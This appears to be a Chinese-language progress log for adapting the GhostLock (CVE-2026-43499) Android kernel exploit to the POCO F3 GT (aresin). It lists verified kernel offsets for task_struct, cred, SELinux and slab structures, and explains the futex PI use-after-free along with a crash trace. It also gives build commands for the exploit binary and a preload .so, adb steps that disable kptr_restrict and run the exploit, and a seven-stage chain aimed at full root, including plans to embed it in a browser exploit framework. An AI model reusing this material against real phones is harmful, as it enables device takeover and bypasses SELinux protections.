# GhostLock (CVE-2026-43499) — POCO F3 GT (aresin) 适配进度

> **设备**: POCO F3 GT / Redmi K40 Gaming Edition (codename: aresin)
> **芯片**: MediaTek Dimensity 1200 (MT6893)
> **系统**: Android 13 / MIUI V14.0.4.0.TKJCNXM
> **内核**: 4.14.186-g0dc1d312efb3
> **日期**: 2026-07-27

---

## 2026-08-16 真机偏移获取（POCO F3 GT aresin / Android 13 / Magisk root）

连接真机（M2104K10I，V14.0.4.0，补丁 2023-07-01），Magisk su 清 kptr_restrict 后拉取
完整 /proc/kallsyms（62,569 符号，地址可见）。**运行时 BASE = _stext - 0x800**
（实测 _stext=0xffffff86e3280800，BASE=0xffffff86e3280000，slide=0x6db280000；
文件偏移 == addr - BASE，与镜像逐字节验证一致）。

**由此修正的偏移（全部有反汇编/符号实证）：**

| 偏移 | 旧值（错） | 真值 | 证据 |
|---|---|---|---|
| INIT_TASK | 0x01c5c058 | **0x1c5bec0** | fork_init ADRP 0x1c5c000 页 + comm="swapper"@+0x798（__get_task_comm/sched_show_task） |
| ROOT_TASK_GROUP | 0x01c6e1f0 | **0x1e65940** | sched_init 传给 init_tg_cfs_entry（.bss） |
| SELINUX_ENFORCING | 0x02120b28 | **0x2080b28** | enforcing_setup ldr [0x2080b28]/[0x2080b2c] |
| SELINUX_BLOB_SIZES | 0x2080308 | **0x2080b08** | selinux_cred_prepare ADRP×4 |
| KMALLOC_CACHES | 0x1783828 | **0x1c4db00** | __kmalloc ldr [x10,w9,sxtw#3] |
| ANON_PIPE_BUF_OPS | 0x1fc150 | **0x1fc950** | generic_pipe_buf_confirm@0（mov w0,wzr;ret） |
| NOOP_LLSEEK | 0x1eed5c | **0x1ef55c** | kallsyms |
| TASK_PID | 0x618 | **0x5c8** | sched_show_task ldr w,[x,#0x5c8] |
| TASK_TGID | 0x61c | **0x5cc** | pid+4（布局） |
| TASK_REAL_PARENT | 0x628 | **0x5d8** | sys_getppid/sched_show_task/proc_pid_status |
| TASK_COMM | 0x830 | **0x798** | __get_task_comm memcpy + sched_show_task %s |
| TASK_TASKS | 0x550 | **0x4c8** | show_state_filter for_each_process |
| TASK_ATOMIC_FLAGS | 0x5d8 | **0x590** | do_execveat_common tbz bit0（PFA_NO_NEW_PRIVS） |
| TASK_SECCOMP | 0x8e8 | **0x838** | __secure_computing ldr w9,[x,#0x838] |
| ASHMEM_IOCTL/MMAP/OPEN/RELEASE | 0/0/0/0 | **0xcf9274/0xcf9b9c/0xcf9d04/0xcf9d84** | kallsyms |
| ASHMEM_MISC(=misc) | 0x1da5d98 | **0x1da6508** | ashmem_init misc_register 参数（fops 指针 @ +0x10，运行时解析） |
| FOPS_SPLICE_READ | 0xb8 | **0xc8** | 4.14 fops 布局（含 get_unmapped_area/check_flags/flock） |
| FOPS_SHOW_FDINFO | 0xd8 | **0xe0** | 同上 |
| COPY_SPLICE_READ | 0 | **0x22f248** | 4.14 用 generic_file_splice_read |
| CONFIGFS_READ/WRITE | - | **0x2964a0/0x296628** | 4.14 configfs 用 read/write（configfs_read_file/write_file） |

**代码适配**：root 下 exploit 直接从 kallsyms 解析 _stext 得 kaslr_base（slide 侧信道不再必需）；
leak_kernel_base 运行时从 ashmem_misc+0x10 解析 fops 表地址；fake fops 表 read/write 槽改用
configfs_read_file/write_file。编译零警告（preload.so 131,952 B / ghostlock_standalone 90,032 B）。

**遗留**：ashmem fops 表地址、init_task 运行时值等依赖设备内存的项已改为运行时解析；
slide 侧信道锚点（0x1c5c658 swapper 串）保留但未在真机验证。

---

## 2026-08-16 真机补验证（vmemmap / struct page / slab_cache）

用设备 kallsyms 锚点函数反汇编镜像，补齐最后两项：

| 项 | 旧值（错） | 真值 | 证据 |
|---|---|---|---|
| VMEMMAP_START | 0xfffffffe00000000 | **0xffffffff00000000** | kfree 的 virt_to_head_page：`(obj>>6 & ~0x3f) \| 0xffffffbf00000000`，PAGE_OFFSET 两种取值均反解出 vmemmap=0xffffffff00000000（OR 技巧：PAGE_OFFSET>>6 高位 0x03fffffe 的 1 位被 0xffffffbf 全覆盖） |
| STRUCT_SLAB_CACHE_OFF | 0x08 | **0x30** | kfree PageSlab 检查后 `ldr x22, [x19, #0x30]`（4.14 SLUB page->slab_cache 与 private union @0x30） |
| STRUCT_PAGE_SIZE 0x40 | （未证实） | **证实** | __put_page lru@0x20 + __free_pages _refcount@0x1c（ldxr/stlxr）+ kfree slab_cache@0x30 + memcg@0x38 → sizeof 0x40 自洽 |
| VMEMMAP_END 上限 | — | **0xffffffff40000000** | DIRECT_MAP_PAGES=0x1000000 × 0x40 = 1GB（覆盖 64GB 物理；设备 12GB 安全） |

sched_task_group（0x848）：sched_move_task@0x7b500 反汇编未在 tsk+0x848 读（读点在 sched_change_group 内联深处），保持"未证实、rtmutex 路径不读、无影响"。

---

## 2026-08-16 真机偏移获取（POCO F3 GT aresin / Android 13 / Magisk root）

对 `ares_images_V14.0.4.0.TKJCNXM_20230710.0000.00_13.0_cn_932146031f.tgz` 中
`images/boot.img`（MTK 头 + gzip 内核，解压 31,844,352 B；版本串
`4.14.186-g0dc1d312efb3 ... Mon Jul 10 04:21:53 UTC 2023` 与设备一致）做了逐偏移复核：

**✅ 复核通过（target.h 保持不变）**
- rt_mutex_waiter：tree_entry 0x00 / pi_tree_entry 0x18 / task 0x30 / lock 0x38 / prio 0x40 / deadline 0x48
  （task_blocks_on_rt_mutex@0xb52cc：`stp x20,x19,[x22,#0x30]`、`str w8,[x22,#0x40]`、`str x10,[x22,#0x48]`）
- task_struct：prio 0x84 / dl.deadline 0x388 / pi_lock 0x85c / pi_waiters 0x868 / pi_top_task(rb_leftmost) 0x870 /
  pi_blocked_on 0x880 / real_cred 0x788 / cred 0x790（commit_creds@0x641e0 + rtmutex 反汇编）
- cred：uid 4 / securebits 0x24 / caps(permitted) 0x30（commit_creds dumpability 比较块）
- KIMAGE_TEXT_BASE 语义：文件偏移 == 相对 _text 的偏移（_stext 在 0x1680000）

**❌ 已修正（src/targets/aresin/target.h）**
- `CRED_SECURITY_OFF` 0x80 → **0x78**（prepare_kernel_cred@0x64604 `str xzr,[x20,#0x78]` = security=NULL；
  commit_creds user@0x80/group_info@0x88 佐证；原 0x80 会写坏 user 指针）
- `INIT_CRED_OFF` 0x01e63850 → **0x1c69158**（prepare_kernel_cred ADRP+ADD 验证）
- `ANON_PIPE_BUF_OPS_OFF` / `NOOP_LLSEEK_OFF` / `KMALLOC_CACHES_OFF` / `SECURITY_HOOK_HEADS_OFF` → **0x0**
  （旧值证伪：0x1fc150 函数中部、0x1eed5c 函数尾部、0x1783828 无引用、0x15f5f70 偏移错误（真 file_open 钩子
  @0x15f6990）；清零后由 util.c 运行时 kallsyms 解析）
- `INIT_TASK_OFF`：0x01c5c058 处全零（非 init_task，"swapper" 串 @0x1c5c658 是独立数据）；init_task 不在镜像内 →
  新增运行时解析（EXPORT_SYMBOL，kallsyms 可靠），root.c/fops.c/util.c 改用 get_init_task_addr() +
  rt_data_alias()（physrw 别名转换）
- `ASHMEM_MISC_FOPS_OFF` 0x1da5d98：零区，真 fops 表不在镜像中 → 保留作安全占位（不可静态恢复）
- `SELINUX_BLOB_SIZES_OFF` 0x2080308 / `SELINUX_ENFORCING_OFF` 0x2120b28：.bss（读 0 → 单 LSM blob 偏移 0 行为正确）保留

**⚠️ 镜像限制**：该 Image 不包含完整 .data/.rodata 指针（init_cred.user、ashmem_misc.name/fops 等指针字段为 0），
fops 表、ksymtab 条目、__setup 表不在镜像中 —— 数据符号只能依赖设备 /proc/kallsyms 运行时解析。

---

## 漏洞触发验证

✅ **已在真机上可靠复现 GhostLock 漏洞**

每次运行 exploit 都会触发 kernel panic，崩溃栈一致：

```
Call trace:
  _raw_spin_trylock+0x1c/0x70
  rt_mutex_adjust_prio_chain+0x104/0x68c    ← PI 链式遍历触发 UAF
  rt_mutex_adjust_pi+0x9c/0xac
  __sched_setscheduler+0xca0/0xe24
  SyS_sched_setattr+0x3e0/0x508
  el0_svc_naked+0x34/0x38
```

根因：`remove_waiter()` 错误清理 `current->pi_blocked_on` 而非 `waiter->task->pi_blocked_on`，导致悬空指针。

---

## 偏移提取结果

### 已提取的偏移（从 vmlinux 固件分析）

| 符号 | 偏移 (from _stext) | 提取方法 | 用途 |
|------|-------------------|----------|------|
| `KMALLOC_CACHES` | `0x1783828` | ADRP 分析 `__kmalloc` | slab 堆喷控制 |
| `ASHMEM_MISC_FOPS` | `0x1da5d98` | ADRP 分析 `ashmem_mmap` | fops 劫持 |
| `SECURITY_HOOK_HEADS` | `0x15f5f70` | ADRP 分析 `security_inode_create` | LSM hook 覆盖 |
| `SELINUX_BLOB_SIZES` | `0x2080308` | ADRP 分析 `selinux_cred_prepare` | SELinux 绕过 |

### 运行时解析的符号（从 /proc/kallsyms）

| 符号 | 解析方法 | 用途 |
|------|----------|------|
| `pipe_buf_ops` | kallsyms → `generic_pipe_buf_confirm` | pipe buffer 识别 |
| `noop_llseek` | kallsyms | fops 表填充 |

### 固定偏移（从 target.h）

| 符号 | 偏移 | 来源 |
|------|------|------|
| `INIT_TASK` | `0x01c5c058` | /proc/kallsyms |
| `INIT_CRED` | `0x01e63850` | /proc/kallsyms |
| `SELINUX_ENFORCING` | `0x02120b28` | /proc/kallsyms |
| `ROOT_TASK_GROUP` | `0x01c6e1f0` | /proc/kallsyms |

---

## 编译构建

### 环境要求

- Android NDK r25+ (aarch64-linux-android28-clang)
- Windows / Linux

### 编译命令

```bash
# Standalone 版本
aarch64-linux-android28-clang \
  -O2 -Isrc -include src/targets/aresin/target.h \
  -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function \
  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/standalone.c \
  -o build/aresin/bin/ghostlock_standalone -pthread

# Preload .so 版本
make preload
```

### 构建产物

```
build/aresin/bin/ghostlock_standalone  (90KB, aarch64 ELF)
build/aresin/bin/preload.so            (131KB, 共享库)
build/embed/su_daemon_aarch64_pie      (14KB, su 守护进程)
```

---

## 真机测试

### 测试步骤

```bash
# 1. 推送文件
base64 build/aresin/bin/ghostlock_standalone | \
  adb shell "su -c 'base64 -d > /data/local/tmp/ghostlock && chmod 755 /data/local/tmp/ghostlock'"

# 2. 设置 kptr_restrict
adb shell "su -c 'echo 0 > /proc/sys/kernel/kptr_restrict'"

# 3. 运行
adb shell "su -c '/data/local/tmp/ghostlock'"
```

### 预期行为

| 阶段 | 输出 | 说明 |
|------|------|------|
| 初始化 | `startup context pid=xxx uid=0` | 设备识别正确 |
| 偏移解析 | `pipe_buf_ops: resolved 0x...` | kallsyms 解析成功 |
| 漏洞触发 | kernel panic → 设备重启 | **预期行为** |

### 测试结果

- ✅ 漏洞触发：每次运行都成功触发 kernel panic
- ✅ 偏移解析：pipe_buf_ops 和 noop_llseek 从 kallsyms 解析
- ✅ 编译构建：零错误零警告
- ⚠️ 完整 LPE：需要进一步调试 pipe 物理读写原语

---

## 技术细节

### 漏洞机制

1. 构建 3-futex PI 环（`f_pi_chain` ↔ `f_pi_target`，`f_wait` 作为 requeue 源）
2. 调用 `FUTEX_CMP_REQUEUE_PI` 触发 `-EDEADLK`
3. `remove_waiter()` 错误清理 `current->pi_blocked_on`
4. `waiter->task->pi_blocked_on` 悬空指向已释放的栈帧
5. `sched_setattr` 触发 PI 链式遍历 → 访问悬空指针 → kernel panic

### 利用链（上游公开版）

| 阶段 | 名称 | 状态 |
|------|------|------|
| 1 | ASLR 泄漏 (prefetch 侧信道) | ✅ 已实现 |
| 2 | GhostLock 触发 | ✅ 已验证 |
| 3 | Stack-UAF Reclaim (PR_SET_MM_MAP) | ✅ 已实现 |
| 4 | 任意地址写入器 | ✅ 已实现 |
| 5 | CEA Spray | ✅ 已实现 |
| 6 | 控制流劫持 (CFH) | ✅ 已实现 |
| 7 | DirtyMode | ✅ 已实现 |

### 4.14 内核适配要点

| 项目 | 6.x 内核 | 4.14 内核 |
|------|----------|----------|
| `rt_mutex_waiter` | rb_node | rb_node (相同) |
| `futex_hashsize` | `nproc * 256` | `256` (全局哈希表) |
| `KERNELSNITCH_THRESHOLD_MULT` | 10 | 3 |
| `PSELECT_WAITER_WORD_SHIFT` | 1 | 2 |
| `CONFIG_KALLSYMS_BASE_RELATIVE` | 是 | 否 |

---

## 文件结构

```
ghostlock-aresin/
├── README.md              # 项目说明
├── PROGRESS.md            # 本文件 - 进度报告
├── EXTRACTED_OFFSETS.md   # 偏移提取详细报告
├── Makefile               # 编译脚本
├── target.h               # 根目录偏移定义（参考）
├── src/
│   ├── targets/aresin/
│   │   └── target.h       # 编译使用的偏移定义
│   ├── main.c             # 主利用逻辑
│   ├── util.c             # 工具函数 + 运行时偏移解析
│   ├── slide.c            # KASLR 泄漏
│   ├── fops.c             # 文件操作原语
│   ├── pipe.c             # pipe 物理读写
│   ├── root.c             # 提权
│   ├── preload.c          # LD_PRELOAD 入口
│   ├── standalone.c       # 独立运行入口
│   ├── common.h           # 公共定义
│   └── kernelsnitch/      # 内核结构体泄漏
├── tools/
│   ├── extract_missing_offsets.sh    # 偏移提取脚本
│   ├── fill_offsets.c                # 运行时偏移查找
│   └── find_syms_via_disasm.c        # 反汇编查找符号
├── boot/
│   ├── boot.img           # 设备 boot 镜像
│   └── kernel_raw         # 解压后的内核
├── firmware/
│   └── vmlinux            # 从固件包提取的内核
└── build/
    └── aresin/bin/
        ├── ghostlock_standalone  # 编译产物
        └── preload.so            # 共享库版本
```

---

## 下一步

1. **调试 pipe 物理读写原语** — 确认 pipe buffer 识别和 slab cache 匹配正确
2. **测试完整 LPE 链** — 从漏洞触发到 root 提权
3. **编译 .so 版本** — 适配 Rootme 浏览器利用框架
4. **优化稳定性** — 提高 exploit 成功率

---

## 参考资料

| 资源 | 链接 |
|------|------|
| 原始研究 | https://nebusec.ai/research/ionstack-part-2/ |
| PoC 仓库 | https://github.com/NebuSec/CyberMeowfia |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-43499 |
| 固件包 | ares_images_V14.0.4.0.TKJCNXM_20230710 |
